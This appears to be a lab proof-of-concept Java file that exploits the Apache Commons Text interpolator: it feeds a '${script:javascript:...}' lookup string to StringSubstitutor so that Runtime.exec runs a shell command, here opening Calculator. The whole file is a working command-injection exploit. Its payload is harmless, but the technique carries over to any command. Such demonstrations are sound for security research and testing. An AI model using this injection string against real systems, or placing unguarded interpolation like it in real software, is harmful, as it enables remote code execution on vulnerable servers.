package com.lab;


import org.apache.commons.text.StringSubstitutor;

import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        final String text = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec(\"open -na Calculator\")}");
        System.out.println(text);
    }
}